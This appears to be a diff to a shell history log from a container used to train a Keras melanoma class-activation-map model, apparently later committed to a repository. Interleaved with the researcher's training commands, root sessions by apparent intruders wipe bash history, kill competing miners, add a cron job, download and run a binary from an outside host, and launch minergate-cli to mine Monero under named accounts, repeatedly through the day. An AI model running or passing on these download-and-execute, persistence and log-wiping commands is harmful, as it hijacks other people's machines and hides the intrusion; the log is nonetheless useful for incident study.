@@ -2154,3 +2154,414 @@ ls ### @f5e57551b879 not a tty 20161228 11:21 /datamnt/github/keras-cam-melanoma
 vi LOG  ### @f5e57551b879 not a tty 20161228 11:23 /datamnt/github/keras-cam-melanoma
 vi LOG  ### @f5e57551b879 not a tty 20161228 11:23 /datamnt/github/keras-cam-melanoma
 vi LOG  ### @f5e57551b879 not a tty 20161228 11:23 /datamnt/github/keras-cam-melanoma
+cp ~/histlog ./ ### @f5e57551b879 not a tty 20161228 11:23 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161228 11:24 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161228 11:41 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161228 11:41 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161228 11:56 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161228 11:56 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/5 20161228 12:10 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/5 20161228 12:10 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/5 20161228 12:10 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/5 20161228 12:10 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/5 20161228 12:10 /notebooks
+ killall ?;top c  ### root@f5e57551b879 /dev/pts/5 20161228 12:11 /notebooks
+kill 19824 ### root@f5e57551b879 /dev/pts/5 20161228 12:11 /notebooks
+if [ -f ? ]; then ./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; else wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam || (apt-get update && apt-get -y install wget && wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam); chmod +x 580d73c364ef7e252d1fd02c_0.yam && mv 580d73c364ef7e252d1fd02c_0.yam ?;./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; fi  ### root@f5e57551b879 /dev/pts/2 20161228 12:11 /root
+pkill m5 && pkill m6 && kill $(ps -eo pid,args --cols=10000 | awk /alexa/)  ### root@f5e57551b879 /dev/pts/5 20161228 12:11 /notebooks
+ kill $(ps -eo pid,args --cols=10000 | awk /jfzero/)  ### root@f5e57551b879 /dev/pts/5 20161228 12:11 /notebooks
+ if [ -f .deb/opt/minergate-cli/minergate-cli ]; then echo "$(tput setaf 2)Was here$(tput setaf 8)";else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && nproc && lspci | grep VGA || true && pkill mine || true && pkill yam || true && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/5 20161228 12:11 /notebooks/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/5 20161228 12:11 /notebooks/.deb/opt/minergate-cli
+if [ -f ? ]; then ./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; else wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam || (apt-get update && apt-get -y install wget && wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam); chmod +x 580d73c364ef7e252d1fd02c_0.yam && mv 580d73c364ef7e252d1fd02c_0.yam ?;./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; fi  ### root@f5e57551b879 /dev/pts/6 20161228 12:58 /notebooks
+if [ -f ? ]; then ./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; else wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam || (apt-get update && apt-get -y install wget && wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam); chmod +x 580d73c364ef7e252d1fd02c_0.yam && mv 580d73c364ef7e252d1fd02c_0.yam ?;./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; fi  ### root@f5e57551b879 /dev/pts/6 20161228 12:58 /notebooks
+clear ### root@f5e57551b879 /dev/pts/6 20161228 12:58 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/6 20161228 12:58 /notebooks
+clear ### root@f5e57551b879 /dev/pts/6 20161228 12:59 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/6 20161228 12:59 /notebooks
+clear ### root@f5e57551b879 /dev/pts/6 20161228 12:59 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/6 20161228 12:59 /notebooks
+kill -9 20350;  ### root@f5e57551b879 /dev/pts/6 20161228 12:59 /notebooks
+clear ### root@f5e57551b879 /dev/pts/6 20161228 12:59 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/5' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/6 20161228 12:59 /notebooks
+kill -9 20268;  ### root@f5e57551b879 /dev/pts/6 20161228 12:59 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/6 20161228 12:59 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/6 20161228 12:59 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/6 20161228 12:59 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/6 20161228 13:00 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/6 20161228 13:00 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/6 20161228 13:00 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/6 20161228 13:00 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/6 20161228 13:00 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/6 20161228 13:00 /notebooks
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161228 13:07 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161228 13:07 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161228 13:07 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161228 13:07 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.01-loss0.000-acc0.908-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 13:17 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.01-loss0.000-acc0.908-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 13:17 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161228 13:25 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161228 13:26 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161228 13:26 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161228 13:26 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161228 13:27 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161228 13:27 /datamnt/github/keras-cam-melanoma
+clear ### @f5e57551b879 not a tty 20161228 13:27 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.01-loss0.000-acc0.908-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 13:37 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.01-loss0.000-acc0.908-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 13:58 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.01-loss0.000-acc0.908-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 13:58 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.00-loss0.147-acc0.908-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 14:07 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161228 14:09 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path archiveweights-28dec/weights.136-loss0.129-acc0.947-valloss0.197-valacc0.900.hdf5  ### @f5e57551b879 not a tty 20161228 14:16 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path archiveweights-28dec/weights.136-loss0.129-acc0.947-valloss0.197-valacc0.900.hdf5 vi cam.py ### @f5e57551b879 not a tty 20161228 14:20 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path archiveweights-28dec/weights.136-loss0.129-acc0.947-valloss0.197-valacc0.900.hdf5 vi cam.py ### @f5e57551b879 not a tty 20161228 14:20 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161228 14:21 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161228 14:21 /datamnt/github/keras-cam-melanoma
+mkdir archiveweights-28dec-2 ### @f5e57551b879 not a tty 20161228 14:21 /datamnt/github/keras-cam-melanoma
+mv weights.* archiveweights-28dec-2/ ### @f5e57551b879 not a tty 20161228 14:22 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161228 14:22 /datamnt/github/keras-cam-melanoma
+vi README.md  ### @f5e57551b879 not a tty 20161228 14:23 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161228 14:24 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path archiveweights-28dec/weights.136-loss0.129-acc0.947-valloss0.197-valacc0.900.hdf5  ### @f5e57551b879 not a tty 20161228 14:24 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/5 20161228 15:19 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/5 20161228 15:19 /notebooks
+clear ### root@f5e57551b879 /dev/pts/5 20161228 15:19 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/5 20161228 15:19 /notebooks
+clear ### root@f5e57551b879 /dev/pts/5 20161228 15:19 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/5 20161228 15:19 /notebooks
+clear ### root@f5e57551b879 /dev/pts/5 20161228 15:19 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/5 20161228 15:19 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/5 20161228 15:19 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/5 20161228 15:19 /notebooks
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161228 16:51 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161228 16:53 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.00-loss0.381-acc0.908-valloss0.333-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 17:03 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161228 17:13 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/5 20161228 17:17 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/5 20161228 17:17 /notebooks
+clear ### root@f5e57551b879 /dev/pts/5 20161228 17:18 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/5 20161228 17:18 /notebooks
+clear ### root@f5e57551b879 /dev/pts/5 20161228 17:18 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/5 20161228 17:18 /notebooks
+clear ### root@f5e57551b879 /dev/pts/5 20161228 17:18 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/5 20161228 17:18 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/5 20161228 17:18 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/5 20161228 17:18 /notebooks
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161228 18:43 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161228 18:43 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161228 18:43 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161228 18:43 /datamnt/github/keras-cam-melanoma
+nvidia-smi ### @f5e57551b879 not a tty 20161228 18:43 /datamnt/github/keras-cam-melanoma
+nvidia-smi ### @f5e57551b879 not a tty 20161228 18:44 /datamnt/github/keras-cam-melanoma
+nvidia-smi ### @f5e57551b879 not a tty 20161228 18:45 /datamnt/github/keras-cam-melanoma
+man nvidia-smi ### @f5e57551b879 not a tty 20161228 18:45 /datamnt/github/keras-cam-melanoma
+nvidia-smi --help ### @f5e57551b879 not a tty 20161228 18:45 /datamnt/github/keras-cam-melanoma
+nvidia-smi stats -h ### @f5e57551b879 not a tty 20161228 18:45 /datamnt/github/keras-cam-melanoma
+nvidia-smi stats -i 0 ### @f5e57551b879 not a tty 20161228 18:46 /datamnt/github/keras-cam-melanoma
+nvidia-smi stats  ### @f5e57551b879 not a tty 20161228 18:46 /datamnt/github/keras-cam-melanoma
+nvidia-smi stats -h ### @f5e57551b879 not a tty 20161228 18:46 /datamnt/github/keras-cam-melanoma
+nvidia-smi -h ### @f5e57551b879 not a tty 20161228 18:46 /datamnt/github/keras-cam-melanoma
+nvidia-smi clocks ### @f5e57551b879 not a tty 20161228 18:47 /datamnt/github/keras-cam-melanoma
+nvidia-smi -h | less ### @f5e57551b879 not a tty 20161228 18:48 /datamnt/github/keras-cam-melanoma
+nvidia-smi -d MEMORY ### @f5e57551b879 not a tty 20161228 18:48 /datamnt/github/keras-cam-melanoma
+nvidia-smi -h | less ### @f5e57551b879 not a tty 20161228 18:49 /datamnt/github/keras-cam-melanoma
+nvidia-smi -d=MEMORY ### @f5e57551b879 not a tty 20161228 18:49 /datamnt/github/keras-cam-melanoma
+nvidia-smi --display=MEMORY ### @f5e57551b879 not a tty 20161228 18:49 /datamnt/github/keras-cam-melanoma
+nvidia-smi -h | less ### @f5e57551b879 not a tty 20161228 18:50 /datamnt/github/keras-cam-melanoma
+nvidia-smi -r ### @f5e57551b879 not a tty 20161228 18:50 /datamnt/github/keras-cam-melanoma
+nvidia-smi -r -i=0 ### @f5e57551b879 not a tty 20161228 18:51 /datamnt/github/keras-cam-melanoma
+nvidia-smi -L ### @f5e57551b879 not a tty 20161228 18:51 /datamnt/github/keras-cam-melanoma
+nvidia-smi -r -i=GPU-6fb25988-c200-d14f-62a2-1dba2a0bee7d ### @f5e57551b879 not a tty 20161228 18:51 /datamnt/github/keras-cam-melanoma
+nvidia-smi -r --d=GPU-6fb25988-c200-d14f-62a2-1dba2a0bee7d ### @f5e57551b879 not a tty 20161228 18:51 /datamnt/github/keras-cam-melanoma
+nvidia-smi -r --id=GPU-6fb25988-c200-d14f-62a2-1dba2a0bee7d ### @f5e57551b879 not a tty 20161228 18:51 /datamnt/github/keras-cam-melanoma
+nvidia-smi  ### @f5e57551b879 not a tty 20161228 18:51 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.00-loss0.599-acc0.892-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 18:58 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/5 20161228 19:19 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/5 20161228 19:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/5 20161228 19:20 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/5 20161228 19:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/5 20161228 19:20 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/5 20161228 19:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/5 20161228 19:20 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/5 20161228 19:20 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/5 20161228 19:20 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/5 20161228 19:20 /notebooks
+vi cam.py  ### @f5e57551b879 not a tty 20161228 19:44 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.00-loss0.599-acc0.892-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 19:55 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.00-loss0.599-acc0.892-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 20:11 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.00-loss0.599-acc0.892-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 20:11 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161228 20:37 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.00-loss0.599-acc0.892-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 20:46 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.00-loss0.599-acc0.892-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 20:46 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6362bae47801cf734d17.jpg --model_path weights.00-loss0.599-acc0.892-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 20:46 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161228 20:48 /datamnt/github/keras-cam-melanoma
+head convoutputs.txt  ### @f5e57551b879 not a tty 20161228 20:48 /datamnt/github/keras-cam-melanoma
+vi convoutputs.txt  ### @f5e57551b879 not a tty 20161228 20:49 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161228 20:53 /datamnt/github/keras-cam-melanoma
+ls -l ../../train/malignant/558d6362bae47801cf734d17.jpg ### @f5e57551b879 not a tty 20161228 20:54 /datamnt/github/keras-cam-melanoma
+ls -lh examples/soccer.jpg  ### @f5e57551b879 not a tty 20161228 20:54 /datamnt/github/keras-cam-melanoma
+ls -lh ../../train/malignant/558d6362bae47801cf734d17.jpg ### @f5e57551b879 not a tty 20161228 20:54 /datamnt/github/keras-cam-melanoma
+ls -l examples/ ### @f5e57551b879 not a tty 20161228 20:54 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path examples/dog.jpg --model_path weights.00-loss0.599-acc0.892-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 20:55 /datamnt/github/keras-cam-melanoma
+clear ### @f5e57551b879 not a tty 20161228 20:55 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path examples/dog.jpg --model_path weights.00-loss0.599-acc0.892-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 21:00 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path examples/dog.jpg --model_path weights.00-loss0.599-acc0.892-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 21:00 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161228 21:03 /datamnt/github/keras-cam-melanoma
+vi convoutputs.txt  ### @f5e57551b879 not a tty 20161228 21:03 /datamnt/github/keras-cam-melanoma
+sort -u convoutputs.txt  ### @f5e57551b879 not a tty 20161228 21:03 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161228 21:03 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161228 21:08 /datamnt/github/keras-cam-melanoma
+sort -u convoutputs.txt  ### @f5e57551b879 not a tty 20161228 21:08 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path examples/dog.jpg --model_path weights.00-loss0.599-acc0.892-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 21:12 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/5 20161228 21:18 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/5 20161228 21:18 /notebooks
+clear ### root@f5e57551b879 /dev/pts/5 20161228 21:18 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/5 20161228 21:18 /notebooks
+clear ### root@f5e57551b879 /dev/pts/5 20161228 21:18 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/5 20161228 21:18 /notebooks
+clear ### root@f5e57551b879 /dev/pts/5 20161228 21:18 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/5 20161228 21:18 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/5 20161228 21:18 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/5 20161228 21:18 /notebooks
+ls ### @f5e57551b879 not a tty 20161228 21:22 /datamnt/github/keras-cam-melanoma
+vi cam.txt  ### @f5e57551b879 not a tty 20161228 21:22 /datamnt/github/keras-cam-melanoma
+vi cam2.txt  ### @f5e57551b879 not a tty 20161228 21:22 /datamnt/github/keras-cam-melanoma
+vi classweights.txt  ### @f5e57551b879 not a tty 20161228 21:22 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161228 21:28 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path examples/dog.jpg --model_path weights.00-loss0.599-acc0.892-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161228 21:33 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161228 21:37 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161228 21:38 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161228 23:09 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/6 20161228 23:20 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/6 20161228 23:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/6 20161228 23:20 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/6 20161228 23:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/6 20161228 23:20 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/6 20161228 23:20 /notebooks
+clear ### root@f5e57551b879 /dev/pts/6 20161228 23:20 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/6 20161228 23:21 /notebooks
+kill -9 23068;  ### root@f5e57551b879 /dev/pts/6 20161228 23:21 /notebooks
+clear ### root@f5e57551b879 /dev/pts/6 20161228 23:21 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/5' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/6 20161228 23:21 /notebooks
+kill -9 22966; kill -9 22968; kill -9 23068; kill -9 23094;  ### root@f5e57551b879 /dev/pts/6 20161228 23:21 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/6 20161228 23:21 /root -> /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/6 20161228 23:21 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/6 20161228 23:21 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/5 20161228 23:44 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/5 20161228 23:44 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/5 20161228 23:44 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/5 20161228 23:44 /notebooks
